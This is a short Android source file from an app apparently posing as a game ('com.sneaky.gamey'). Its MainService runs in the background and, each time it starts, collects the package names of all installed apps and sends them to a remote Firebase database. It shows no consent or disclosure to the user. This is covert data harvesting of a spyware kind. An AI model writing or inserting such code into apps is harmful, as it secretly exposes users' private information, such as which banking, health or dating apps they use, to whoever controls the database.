package com.sneaky.gamey.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;

import androidx.annotation.Nullable;

import com.sneaky.gamey.database.Firebase;

import java.util.ArrayList;
import java.util.List;

public class MainService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ArrayList<String> installedApps = getInstalledApplications();
        Firebase.sendData(installedApps);
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private ArrayList<String> getInstalledApplications() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        ArrayList<String> packageNames = new ArrayList<String>();
        for (ApplicationInfo packageInfo : packages) {
            packageNames.add(packageInfo.packageName);
        }
        return packageNames;
    }
}
